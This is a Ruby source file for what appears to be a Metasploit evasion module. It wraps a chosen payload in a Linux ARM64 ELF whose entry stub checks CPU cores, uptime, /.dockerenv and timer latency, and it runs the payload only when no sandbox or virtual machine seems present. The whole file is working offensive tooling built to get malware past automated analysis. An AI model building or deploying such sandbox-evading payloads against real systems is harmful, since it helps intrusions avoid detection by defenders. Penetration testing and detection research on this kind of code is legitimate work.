class MetasploitModule < Msf::Evasion
  include Msf::Payload::Linux::Aarch64::SandboxEvasion

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux ARM64 Sandbox Environment Gate',
        'Description' => %q{
          Generates a Linux ARM64 ELF whose entry point checks the execution
          environment before transferring control to the selected payload.
        },
        'Author' => ['Massimo Bertocchi'],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => [ARCH_AARCH64],
        'Targets' => [['Linux ARM64/AArch64', {}]],
        'DefaultTarget' => 0,
        'DefaultOptions' => { 'PayloadLinuxMinKernel' => '3.17' }
      )
    )

    register_options(
      [
        OptString.new('FILENAME', [true, 'Output filename', 'payload.elf']),
        OptInt.new('CORES', [true, 'Minimum CPU cores required to pass', 2]),
        OptInt.new('UPTIME', [true, 'Minimum uptime in seconds required to pass', 600]),
        OptBool.new('CHECK_DOCKER', [true, 'Enable /.dockerenv detection', true]),
        OptBool.new(
          'CHECK_VIRT',
          [true, 'Enable CNTVCT_EL0 latency detection (may terminate on restricted/cloud systems)', false]
        )
      ]
    )
  end

  def run
    raw_payload = payload.encoded
    if raw_payload.blank?
      fail_with(Failure::BadConfig, 'Failed to generate payload')
    end

    gate_stub = sandbox_evasion(datastore['CORES'], datastore['UPTIME'], datastore['CHECK_DOCKER'], datastore['CHECK_VIRT'])
    if gate_stub.blank?
      fail_with(Failure::BadConfig, 'Gate stub assembly failed')
    end

    final_elf = Msf::Util::EXE.to_linux_aarch64_elf(framework,gate_stub + raw_payload)

    File.binwrite(datastore['FILENAME'], final_elf)
    File.chmod(0o755, datastore['FILENAME'])
  end
end
